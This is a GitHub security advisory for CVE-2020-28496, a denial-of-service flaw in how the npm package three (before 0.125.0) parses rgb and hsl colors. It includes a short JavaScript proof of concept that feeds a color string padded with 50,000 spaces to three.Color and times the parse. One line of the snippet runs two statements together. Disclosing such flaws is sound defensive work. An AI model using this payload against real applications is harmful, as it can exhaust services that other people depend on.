# [H] Denial of service in three

## Summary
Severity: High
Advisory: GHSA-fq6p-x6j3-cmmq
CVE: CVE-2020-28496
CWE: CWE-400
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2021-03-01
Source: https://github.com/advisories/GHSA-fq6p-x6j3-cmmq
Type: github-advisory

## Affected
- npm: `three` — affected >=0 <0.125.0

## Details
This affects the package three before 0.125.0. This can happen when handling rgb or hsl colors. 

**PoC:** 
```js
var three = require('three')
function build_blank(n) {
    var ret = "rgb("
    for (var i = 0; i < n; i++) {
        ret += " "
    }
    return ret + "";
}
var Color = three.Color
var time = Date.now();
new Color(build_blank(50000)) var time_cost = Date.now() - time;
console.log(time_cost + " ms")
```

## References
- https://nvd.nist.gov/vuln/detail/CVE-2020-28496
- https://github.com/mrdoob/three.js/issues/21132
- https://github.com/mrdoob/three.js/pull/21143/commits/4a582355216b620176a291ff319d740e619d583e
- https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1065972
- https://snyk.io/vuln/SNYK-JS-THREE-1064931
